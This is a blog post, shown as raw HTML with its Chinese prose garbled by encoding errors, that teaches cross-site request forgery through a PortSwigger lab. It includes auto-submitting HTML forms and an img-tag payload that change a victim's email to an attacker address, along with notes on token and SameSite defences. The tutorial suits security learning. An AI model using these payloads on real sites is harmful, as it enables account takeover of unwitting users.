<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="keywords" content="Hexo Theme Keep"><meta name="description" content="Hexo Theme Keep"><meta name="author" content="Charmersix"><title>Web_CSRF | Charmersix&#39;s Blog</title><link rel="stylesheet" href="/css/style.css"><link rel="shortcut icon" href="/images/logo.png"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css"><script id="hexo-configurations">let KEEP=window.KEEP||{};KEEP.hexo_config={hostname:"charmersix.icu",root:"/",language:"en",path:"search.json"},KEEP.theme_config={toc:{enable:!0,number:!0,expand_all:!0,init_open:!0},style:{primary_color:"#0066cc",logo:"/images/logo.png",favicon:"/images/logo.png",avatar:"/images/head.jpg",font_size:null,font_family:null,hover:{shadow:!0,scale:!0},first_screen:{enable:!0,header_transparent:!0,background_img:"/images/bg.svg",description:"Keep writing and Keep loving.",font_color:null,hitokoto:!0},scroll:{progress_bar:!1,percent:!0}},local_search:{enable:!0,preload:!0},code_copy:{},code_block:{tools:{enable:!0,style:"mac"},highlight_theme:"obsidian"},side_tools:{},pjax:{enable:!1},lazyload:{enable:!0},comment:{enable:!0,use:"waline",valine:{appid:null,appkey:null,server_urls:null,placeholder:null},gitalk:{github_id:null,github_admins:null,repository:null,client_id:null,client_secret:null,proxy:null},twikoo:{env_id:null,region:null,version:"1.6.8"},waline:{server_url:"https://waline-charmersix.vercel.app/",reaction:!0,version:2}},post:{author_label:{enable:!1,auto:!1,custom_label_list:["CTFer"]},word_count:{enable:!0,wordcount:!0,min2read:!0},img_align:"left",copyright_info:!1},version:"3.6.1"},KEEP.language_ago={second:"%s seconds ago",minute:"%s minutes ago",hour:"%s hours ago",day:"%s days ago",week:"%s weeks ago",month:"%s months ago",year:"%s years ago"},KEEP.language_code_block={copy:"Copy code",copied:"Copied",fold:"Fold code block",folded:"Folded"},KEEP.language_copy_copyright={copy:"Copy copyright info",copied:"Copied",title:"Original article title",author:"Original article author",link:"Original article link"}</script><meta name="generator" content="Hexo 5.4.2"></head><body><div class="progress-bar-container"></div><main class="page-container"><div class="page-main-content"><div class="page-main-content-top"><header class="header-wrapper"><div class="header-content"><div class="left"><a class="logo-image" href="/"><img src="/images/logo.png"> </a><a class="logo-title" href="/">Charmersix&#39;s Blog</a></div><div class="right"><div class="pc"><ul class="menu-list"><li class="menu-item"><a href="/">HOME</a></li><li class="menu-item"><a href="/archives">ARCHIVES</a></li><li class="menu-item"><a href="/tags">TAGS</a></li><li class="menu-item"><a href="/links">LINKS</a></li><li class="menu-item"><a href="/about">ABOUT</a></li><li class="menu-item search search-popup-trigger"><i class="fas fa-search"></i></li></ul></div><div class="mobile"><div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div><div class="icon-item menu-bar"><div class="menu-bar-middle"></div></div></div></div></div><div class="header-drawer"><ul class="drawer-menu-list"><li class="drawer-menu-item flex-center"><a href="/">HOME</a></li><li class="drawer-menu-item flex-center"><a href="/archives">ARCHIVES</a></li><li class="drawer-menu-item flex-center"><a href="/tags">TAGS</a></li><li class="drawer-menu-item flex-center"><a href="/links">LINKS</a></li><li class="drawer-menu-item flex-center"><a href="/about">ABOUT</a></li></ul></div><div class="window-mask"></div></header></div><div class="page-main-content-middle"><div class="main-content"><div class="fade-in-down-animation"><div class="post-page-container"><div class="article-content-container"><div class="article-title"><span class="title-hover-animation">Web_CSRF</span></div><div class="article-header"><div class="avatar"><img src="/images/head.jpg"></div><div class="info"><div class="author"><span class="name">Charmersix</span></div><div class="meta-info"><div class="article-meta-info"><span class="article-date article-meta-item"><i class="fa-regular fa-calendar-plus"></i>&nbsp; <span class="pc">2022-08-26 00:00:00</span> <span class="mobile">2022-08-26 00:00</span> </span><span class="article-update-date article-meta-item"><i class="fas fa-file-pen"></i>&nbsp; <span class="pc">2023-04-09 16:31:34</span> </span><span class="article-tags article-meta-item"><i class="fas fa-tags"></i>&nbsp;<ul><li><a href="/tags/Web/">Web</a>&nbsp;</li><li>| <a href="/tags/CSRF/">CSRF</a>&nbsp;</li></ul></span><span class="article-wordcount article-meta-item"><i class="fas fa-file-word"></i>&nbsp;<span>1.8k Words</span> </span><span class="article-min2read article-meta-item"><i class="fas fa-clock"></i>&nbsp;<span>6 Mins</span> </span><span class="article-pv article-meta-item"><i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span></span></div></div></div></div><div class="article-content keep-markdown-body"><p>æ¯”è¾ƒç®€å•çš„æ´ï¼Œå…¶å®åœ¨CTFshowå¹³å°ä¸Šï¼Œè¿™éƒ¨åˆ†é¢˜ç›®ç›´æ¥æ”¾åœ¨xssäº†ï¼Œå½“ç„¶è¿™éƒ¨åˆ†å’ŒXSSä¹Ÿéå¸¸ç›¸ä¼¼ï¼Œéƒ½æ˜¯åˆ©ç”¨äº†HTMLå’ŒJS</p><h3 id="CSRFæ˜¯ä»€ä¹ˆ"><a href="#CSRFæ˜¯ä»€ä¹ˆ" class="headerlink" title="CSRFæ˜¯ä»€ä¹ˆ"></a>CSRFæ˜¯ä»€ä¹ˆ</h3><p>è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œå…è®¸æ”»å‡»è€…è¯±å¯¼ç”¨æˆ·æ‰§è¡Œä»–ä»¬ä¸æ„¿æ„æ‰§è¡Œçš„æ“ä½œã€‚å…è®¸æ”»å‡»è€…éƒ¨åˆ†è§„é¿åŒæºç­–ç•¥ï¼Œè¯¥ç­–ç•¥æ—¨åœ¨é˜²æ­¢ä¸åŒç½‘ç«™ä¹‹é—´ç›¸äº’å¹²æ‰°ã€‚</p><p>ç®€è¨€ä¹‹ï¼Œå†’å……ç”¨æˆ·ï¼Œåšä¸€äº›æ¶æ„è¯·æ±‚ï¼Œä¼ªè£…ç”¨æˆ·è¿›è¡Œæ¶æ„æ“ä½œã€‚</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202208252202546.svg"></p><h3 id="CSRFæ”»å‡»çš„å½±å“"><a href="#CSRFæ”»å‡»çš„å½±å“" class="headerlink" title="CSRFæ”»å‡»çš„å½±å“"></a>CSRFæ”»å‡»çš„å½±å“</h3><p>åœ¨æˆåŠŸçš„CSRFæ”»å‡»ä¸­ï¼Œæ”»å‡»è€…ä¼šå¯¼è‡´å—å®³è€…ç”¨æˆ·æ— æ„æ‰§è¡ŒæŸé¡¹æ“ä½œã€‚ä¾‹å¦‚ï¼Œæ”¹å—å®³ç”¨æˆ·çš„ç”µå­é‚®ç®±åœ°å€ã€æ”¹å—å®³ç”¨æˆ·çš„å¤´åƒã€ä¸ªæ€§ç­¾åï¼Œç”šè‡³æ˜¯å¯ä»¥ä¿®æ”¹ä»–çš„å¯†ç è¿›è¡Œèµ„é‡‘è½¬è´¦ã€‚åƒCTFshow_XSSåè¾¹å‡ ä¸ªé¢˜å°±æ˜¯å¦‚æ­¤ã€‚å¦‚æœå—å®³ç”¨æˆ·æ˜¯adminï¼Œé‚£ä¹ˆèƒ½è¿›è¡Œçš„æ“ä½œå¯èƒ½æ›´å¤šã€‚</p><h3 id="CSRFå¦‚ä½•å·¥ä½œ"><a href="#CSRFå¦‚ä½•å·¥ä½œ" class="headerlink" title="CSRFå¦‚ä½•å·¥ä½œ"></a>CSRFå¦‚ä½•å·¥ä½œ</h3><p>CSRFè¦æƒ³å­˜åœ¨ï¼Œå¿…é¡»å…·å¤‡ä¸‰ä¸ªå…³é”®æ¡ä»¶ï¼Œæ‰€ä»¥è¯´è¿™ç§æ´ä¹Ÿæ˜¯å¾ˆå°‘ã€‚</p><p>ï¼‘ã€ç½‘ç«™ä¸­å­˜åœ¨ç”¨æˆ·å¯ç™»å½•çš„åœ°æ–¹ï¼Œå¦‚æœå°±æ˜¯ä¸ªçº¯é™æ€çš„ç½‘ç«™ï¼Œè¿ç”¨æˆ·ç™»å½•ç‚¹éƒ½æ²¡æœ‰ï¼Œé‚£ä¸€åˆ‡éƒ½æ˜¯ç©ºè°ˆã€‚</p><p>ï¼’ã€æ‰§è¡Œè¯¥æ“ä½œæ—¶æ¶‰åŠå‘å‡ºä¸€ä¸ªæˆ–è€…å¤šä¸ªHTTPè¯·æ±‚ï¼Œå¹¶ä¸”ç½‘ç«™ä»…ä¾èµ–cookieæ¥è¯†åˆ«å‘å‡ºè¯·æ±‚çš„ç”¨æˆ·ã€‚æ²¡æœ‰å…¶ä»–æœºåˆ¶å¯ç”¨äºè¿½è¸ªä¼šè¯æˆ–éªŒè¯ç”¨æˆ·è¯·æ±‚ã€‚è€Œä¸”è¿™ä¸ªcookieå¿…é¡»è¦èƒ½åˆ©ç”¨åˆ°å…¶ä»–ç«™ç‚¹ï¼Œå› ä¸ºæˆ‘ä»¬è¦è·¨ç«™ï¼Œå¦‚æœcookieä¸èƒ½è·Ÿèµ°ï¼Œé‚£ä¹Ÿæ˜¯æ²¡ä»€ä¹ˆç”¨çš„ï¼Œæ¯”å¦‚è¯´<a class="link" target="_blank" rel="noopener" href="https://www.jianshu.com/p/ba6500990694">httponly<i class="fas fa-external-link-alt"></i></a>å’Œ<a class="link" target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie/SameSite">SameSite<i class="fas fa-external-link-alt"></i></a>éƒ½ä¼šé˜»ç¢æˆ‘ä»¬çš„CSRFå’ŒXSS</p><p>ï¼“ã€æ‰§è¡ŒCSRFæ“ä½œçš„è¯·æ±‚ä¸åŒ…å«æ”»å‡»è€…æ— æ³•ç¡®å®šæˆ–çŒœæµ‹å…¶å€¼çš„ä»»ä½•å‚æ•°ã€‚ä¾‹å¦‚ï¼Œå½“å¯¼è‡´ç”¨æˆ·æ›´æ”¹å¯†ç æ—¶ï¼Œéœ€è¦çŸ¥é“ç°æœ‰çš„å¯†ç ï¼Œé‚£ä¹ˆè‡ªç„¶æ˜¯æ— æ³•å®ç°ã€‚</p><p>ä¾‹å¦‚ï¼Œå‡è®¾ä¸€ä¸ªç½‘ç«™åŒ…å«ä¸€ä¸ªå…è®¸ç”¨æˆ·æ›´æ”¹è‡ªå·±è´¦æˆ·ä¸Šçš„ç”µå­é‚®ç®±åœ°å€çš„åŠŸèƒ½ã€‚ç”¨æˆ·æ‰§è¡Œæ­¤æ“ä½œæ—¶å€™ã€‚ä¼šå‘å‡ºå¦‚ä¸‹HTTPè¯·æ±‚ï¼š</p><blockquote><p>POST /email/change HTTP/1.1<br>Host: vulnerable-website.com<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 30<br>Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE</p><p>email=<a class="link" href="mailto:&#99;&#104;&#97;&#x72;&#x6d;&#101;&#x72;&#115;&#x69;&#x78;&#64;&#103;&#x6d;&#x61;&#105;&#108;&#46;&#99;&#111;&#x6d;">&#99;&#104;&#97;&#x72;&#x6d;&#101;&#x72;&#115;&#x69;&#x78;&#64;&#103;&#x6d;&#x61;&#105;&#108;&#46;&#99;&#111;&#x6d;<i class="fas fa-external-link-alt"></i></a></p></blockquote><p>è¿™ä¸ªä¾‹å­å°±ç¬¦åˆä¸Šè¿°ä¸‰ä¸ªæ¡ä»¶ï¼Œ</p><ul><li><input checked disabled type="checkbox"> è¯¥ç½‘ç«™å­˜åœ¨ç™»é™†ç‚¹ï¼Œè‡³å°‘å¯ä»¥ç”¨Emailç™»å½•</li><li><input checked disabled type="checkbox"> å°±è¿™ä¸€ä¸ªCookieç‰µè¿ç€</li><li><input checked disabled type="checkbox"> æ²¡æœ‰å…¶ä»–å› ç´ å½±å“æ”»å‡»è€…</li></ul><p>é‚£ä¹ˆå°±å¯ä»¥å¼€å§‹æ”»å‡»ä»–äº†ï¼Œæ„å»ºä¸€ä¸ªHTMLç½‘é¡µï¼Œlike this</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://vulnerable-website.com/email/change&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;pwned@evil-user.net&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆä½ ä¸€å®šå¥½å¥‡ï¼Œè¿™äº›éƒ½è¦è‡ªå·±å†™å—ï¼Œå¯ä¸å¯ä»¥ä¸€é”®æ—¥å«æ˜Ÿï¼Œå½“ç„¶å¯ä»¥ã€‚</p><p>è¿™ä¸ªä¸‹é¢ä¼šç»“åˆé¶åœºå…·ä½“è®²ï¼Œè¿™é‡Œåªæ˜¯ä¸¾ä¸ªå°ğŸŒ°è€Œå·²</p><p>é‚£ä¹ˆè¿™æ—¶å€™å—å®³è€…è®¿é—®æ”»å‡»è€…çš„ç½‘é¡µï¼Œä»–ä»¬åœ¨å­˜åœ¨csrfæ¼æ´çš„ç½‘ç«™çš„é‚®ç®±å°±ä¼šæ”¹å˜æˆæ”»å‡»è€…çš„é‚®ç®±</p><p><code>pwned@evil-user.net</code></p><blockquote><p>å°tips</p><p>å°½ç®¡csrfé€šå¸¸è¢«æè¿°ä¸ºä¸åŸºäºcookieçš„ä¼šè¯å¤„ç†ç›¸å…³ï¼Œä½†å®ƒä¹Ÿå‡ºç°åœ¨åº”ç”¨ç¨‹åºè‡ªåŠ¨å°†ä¸€äº›ç”¨æˆ·å‡­æ®æ·»åŠ åˆ°è¯·æ±‚çš„å…¶ä»–ä¸Šä¸‹æ–‡ä¸­ï¼Œä¾‹å¦‚httpåŸºæœ¬èº«ä»½éªŒè¯å’ŒåŸºäºè¯ä¹¦çš„èº«ä»½éªŒè¯ã€‚</p></blockquote><h3 id="æ„å»ºCSRFæ”»å‡»"><a href="#æ„å»ºCSRFæ”»å‡»" class="headerlink" title="æ„å»ºCSRFæ”»å‡»"></a>æ„å»ºCSRFæ”»å‡»</h3><p>ä»ä¸Šè¾¹ğŸŒ°ä¸­èƒ½çœ‹å‡ºï¼Œæˆ‘ä»¬è‡ªå·±å»æ‰‹åŠ¨å†™CSRFæ¼æ´åˆ©ç”¨çš„HTMLå¯èƒ½ä¼šæ¯”è¾ƒéº»çƒ¦ï¼Œç‰¹åˆ«æ˜¯æ‰€éœ€çš„è¯·æ±‚åŒ…å«å¤§é‡å‚æ•°æˆ–è¯·æ±‚ä¸­æœ‰å…¶ä»–éº»çƒ¦çš„æƒ…å†µä¸‹ã€‚æ„å»ºCSRFä¸€é”®æ—¥ğŸ›°çš„æ–¹æ³•å°±æ˜¯ä½¿ç”¨burp suiteå†…ç½®çš„CSRF PoC ç”Ÿæˆå™¨</p><p>è¿™è¾¹æˆ‘ä»¬æ¥ä¸€ä¸ªç®€å•çš„é¶åœºï¼Œä¸»è¦æ˜¯è¯´ä¸€ä¸‹bpçš„ä½¿ç”¨ã€‚</p><p>é¶åœºæˆ‘ä»¬é€‰ç”¨çš„æ˜¯burpå®˜ç½‘çš„<a class="link" target="_blank" rel="noopener" href="https://portswigger.net/web-security/csrf">é¶åœº<i class="fas fa-external-link-alt"></i></a>csrfç¬¬äºŒé¢˜</p><p>æˆ‘ä»¬æŠ“åŒ…æ”¹é‚®ç®±çœ‹ä¸€ä¸‹ï¼Œä¼šå‘ç°è¿™é‡Œè¾¹ç»‘å®šäº†cookieå’Œä¸€ä¸ªtokenä¹Ÿå°±æ˜¯å†…ä¸ªCSRF=</p><p>ç„¶åæˆ‘ä»¬çœ‹ä¸€ä¸‹è¿™ä¸ªcookieæœ‰ä»€ä¹ˆè§„å¾‹ï¼Œå†æ”¹ä¸€ä¸‹</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202208262204091.png"></p><p>ç»è¿‡æµ‹è¯•ï¼Œæˆ‘ä»¬å‘ç°ï¼ŒæŠŠä¼ è¾“æ–¹å¼æ”¹æˆGETï¼Œtokenå°±æ²¡ä»€ä¹ˆåµç”¨äº†</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202208262306987.png"></p><p>å°±å¯ä»¥ç”Ÿæˆä¸€ä¸ªpoc</p><p>åœ¨è¿™ä¸ªé€‰é¡¹é‡Œå¯ä»¥å‹¾é€‰è‡ªåŠ¨æäº¤</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202208262307922.png"></p><p>å½“ç„¶è¦è‡ªåŠ¨æäº¤äº†ï¼Œå†è®©å—å®³è€…å»ç‚¹å‡»æäº¤ï¼Œä¸æ˜¯æ·»éº»çƒ¦å˜›</p><p>æˆ‘ä»¬ç›´æ¥å¤åˆ¶ä¸‹æ¥html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://0ae30021031005aac00448e6001b00b9.web-security-academy.net/my-account/change-email&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;charmersix@gmail.com&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬è¦æŠŠé‚®ç®±æ”¹æˆæ”»å‡»è€…çš„é‚®ç®±</p><p>æˆ‘ä»¬æ¥åˆ°è¿™ä¸ªexploit serverï¼ŒæŠŠè¿™å¨HTMLå¤åˆ¶åˆ°æ¡†é‡Œ</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202208262313156.png"></p><p>ç„¶åç‚¹å‡»æ¼æ´åˆ©ç”¨</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202208262314197.png"></p><p>CSRFæ¼æ´åˆ©ç”¨</p><p>CSRFä¸XSSçš„åŸç†åŸºæœ¬ç›¸åŒã€‚é€šå¸¸ï¼Œæ”»å‡»è€…ä¼šå°†æ¶æ„HTMLæ”¾ç½®åˆ°ä»–ä»¬æ§åˆ¶çš„ç½‘ç«™ä¸Šï¼Œç„¶åè¯±å¯¼å—å®³è€…è®¿é—®è¯¥ç½‘ç«™ã€‚è¿™å¯ä»¥ é€šè¿‡ç”µå­é‚®ä»¶æˆ–ç¤¾äº¤åª’ä½“æ¶ˆæ¯å‘ç”¨æˆ·æä¾›ç½‘ç«™é“¾æ¥æ¥å®Œæˆã€‚æˆ–è€…å¦‚æœæ”»å‡»è¢«æ”¾ç½®åœ¨ä¸€ä¸ªæµè¡Œçš„ç½‘ç«™ä¸­ï¼ˆä¾‹å¦‚ï¼ŒæŸç”¨æˆ·è¯„è®ºåŒºï¼‰ï¼Œä»–ä»¬å°±ç­‰ç€æœ‰ç”¨æˆ·è®¿é—®æ¶æ„ç½‘ç«™ã€‚</p><p>è¯·æ³¨æ„ï¼Œä¸€äº›ç®€å•çš„CSRFæ¼æ´åˆ©ç”¨ä½¿ç”¨GETæ–¹å¼ï¼Œå¹¶ä¸”å¯ä»¥åœ¨æ˜“å—æ”»å‡»çš„ç½‘ç«™ä¸Šä½¿ç”¨å•ä¸ªURLå®Œå…¨è‡ªåŒ…å«ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯èƒ½ä¸éœ€è¦å¤–éƒ¨ç«™ç‚¹ï¼Œå¹¶ä¸”å¯ä»¥ç›´æ¥å‘å—å®³è€…æä¾›æ˜“å—æ”»å‡»ä¸Šçš„æ¶æ„URLï¼åœ¨å‰é¢çš„ä¾‹å­ä¸­ï¼Œå¦‚æœå¯ä»¥ä½¿ç”¨GETæ–¹æ³•æ‰§è¡Œæ›´æ”¹ç”µå­é‚®ç®±åœ°å€çš„è¯·æ±‚ï¼Œé‚£ä¹ˆè‡ªåŒ…å«æ”»å‡»å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://vulnerable-website.com/email/change?email=pwned@evil-user.net&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="é˜²æ­¢CSRFæ”»å‡»"><a href="#é˜²æ­¢CSRFæ”»å‡»" class="headerlink" title="é˜²æ­¢CSRFæ”»å‡»"></a>é˜²æ­¢CSRFæ”»å‡»</h3><p>é˜²å¾¡CSRFæ”»å‡»çš„æœ€å¯é æ–¹æ³•æ˜¯åœ¨ç›¸å…³è¯·æ±‚ä¸­åŒ…å«CSRFã€€ï½”ï½ï½‹ï½…ï½ã€‚</p><p>å¹¶ä¸”tokenè¦æ»¡è¶³ä¸‹é¢ä¸‰ä¸ªæ¡ä»¶ï¼š</p><ul><li><input checked disabled type="checkbox"> å¯¹äºä¸€èˆ¬çš„tokenï¼Œå€¼æ˜¯ä¸å¯é¢„æµ‹çš„ã€‚</li><li><input checked disabled type="checkbox"> sessionç»‘å®šåˆ°ç”¨æˆ·</li><li><input checked disabled type="checkbox"> æ‰§è¡Œç›¸å…³æ“ä½œä¹‹å‰ï¼Œtokenä¸€ç›´èƒ½ç»è¿‡éªŒè¯</li></ul><p>æœ€å¸¸è§çš„é˜²å¾¡å°±æ˜¯samesiteã€€cookie</p><h3 id="å¸¸è§çš„CSRFæ¼æ´"><a href="#å¸¸è§çš„CSRFæ¼æ´" class="headerlink" title="å¸¸è§çš„CSRFæ¼æ´"></a>å¸¸è§çš„CSRFæ¼æ´</h3><p>CSRFä¸€èˆ¬å‡ºç°åœ¨é‚®ç®±ä¿®æ”¹ï¼Œè½¬è´¦ä¿®æ”¹</p><p>æœ€æœ‰è¶£çš„CSRFæ¼æ´ç”±äºtokenéªŒè¯é”™è¯¯å¼•èµ·ã€‚</p><p>åœ¨å‰é¢çš„ç¤ºä¾‹ä¸­ï¼Œå‡è®¾applicationç°åœ¨åœ¨æ›´æ”¹ç”¨æˆ·ç”µå­é‚®ç®±çš„è¯·æ±‚ä¸­åŒ…å«ä¸€ä¸ªCSRFtokenï¼š</p><blockquote><p>POST /email/change HTTP/1.1<br>Host: vulnerable-website.com<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 68<br>Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm</p><p>csrf=WfF1szMUHhiokx9AHFply5L2xAOfjRkE&amp;email=<a class="link" href="mailto:&#119;&#105;&#101;&#110;&#x65;&#114;&#x40;&#x6e;&#111;&#114;&#x6d;&#x61;&#x6c;&#x2d;&#x75;&#x73;&#101;&#x72;&#x2e;&#99;&#x6f;&#x6d;">&#119;&#105;&#101;&#110;&#x65;&#114;&#x40;&#x6e;&#111;&#114;&#x6d;&#x61;&#x6c;&#x2d;&#x75;&#x73;&#101;&#x72;&#x2e;&#99;&#x6f;&#x6d;<i class="fas fa-external-link-alt"></i></a></p></blockquote><p>è¿™ç§çœ‹èµ·æ¥å¯ä»¥é˜²å¾¡CSRFæ”»å‡»ï¼Œå› ä¸ºå®ƒä¸å…·å¤‡CSRFå­˜åœ¨çš„æ¡ä»¶ï¼šç½‘ç«™ä¸ä»…ä»…ä¾èµ–äºcookieè¿›è¡Œä¼šè¯å¤„ç†ï¼Œå¹¶ä¸”è¯·æ±‚åŒ…å«ä¸€ä¸ªæ”»å‡»è€…æ— æ³•ç¡®å®šå…¶å€¼çš„å‚æ•°ã€‚ç„¶è€Œï¼Œæœ‰å¤šç§æ–¹æ³•å¯ä»¥æ‰“ç ´é˜²å¾¡ï¼Œæ‰€ä»¥è¿˜æ˜¯æœ‰è¢«CSRFæ”»å‡»çš„å¯èƒ½ã€‚</p><p>è¿˜æœ‰å¾ˆå¤šå…·ä½“çš„æƒ…å†µï¼Œï½‚ï½é¶åœºé‡Œä¹Ÿæ˜¯æœ‰çš„ã€‚</p><p>CSRFè¿˜æ˜¯å¾ˆç®€å•çš„ï¼ŒåŸç†ä¹Ÿæ¯”è¾ƒå¥½ç†è§£ï¼Œå…·ä½“ç»•è¿‡å§‹ç»ˆä¹Ÿç¦»ä¸å¼€cookieï¼Œtokenï¼Œè¯·æ±‚å¤´ä¹‹ç±»çš„ã€‚</p></div><ul class="post-tags-box"><li class="tag-item"><a href="/tags/Web/">#Web</a>&nbsp;</li><li class="tag-item"><a href="/tags/CSRF/">#CSRF</a>&nbsp;</li></ul><div class="article-nav"><div class="article-prev"><a class="prev" rel="prev" href="/2022/08/28/pikachu%E9%9D%B6%E5%9C%BA/"><span class="left arrow-icon flex-center"><i class="fas fa-chevron-left"></i> </span><span class="title flex-center"><span class="post-nav-title-item">pikachué¶åœº</span> <span class="post-nav-item">Prev posts</span></span></a></div><div class="article-next"><a class="next" rel="next" href="/2022/08/10/hw01/"><span class="title flex-center"><span class="post-nav-title-item">é—²èŠâ€”â€”ç¬¬ä¸€æ¬¡HW</span> <span class="post-nav-item">Next posts</span> </span><span class="right arrow-icon flex-center"><i class="fas fa-chevron-right"></i></span></a></div></div><div class="comment-container"><div class="comments-container"><div id="comments-anchor"></div><div class="comment-area-title"><i class="fas fa-comments"></i>&nbsp;Comments</div><div class="waline-comment-container"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@waline/client@v2/dist/waline.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@waline/client@v2/dist/waline-meta.css"><script src="//cdn.jsdelivr.net/npm/@waline/client@v2/dist/waline.js"></script><div id="waline-comment"></div><script>function loadWaline(){Waline.init({el:"#waline-comment",serverURL:"https://waline-charmersix.vercel.app/",lang:"en",comment:".post-comments-count",reaction:!0})}window.addEventListener("DOMContentLoaded",loadWaline)</script></div></div></div></div><div class="toc-content-container"><div class="post-toc-wrap"><div class="post-toc"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF%E6%98%AF%E4%BB%80%E4%B9%88"><span class="nav-number">1.</span> <span class="nav-text">CSRFæ˜¯ä»€ä¹ˆ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF%E6%94%BB%E5%87%BB%E7%9A%84%E5%BD%B1%E5%93%8D"><span class="nav-number">2.</span> <span class="nav-text">CSRFæ”»å‡»çš„å½±å“</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C"><span class="nav-number">3.</span> <span 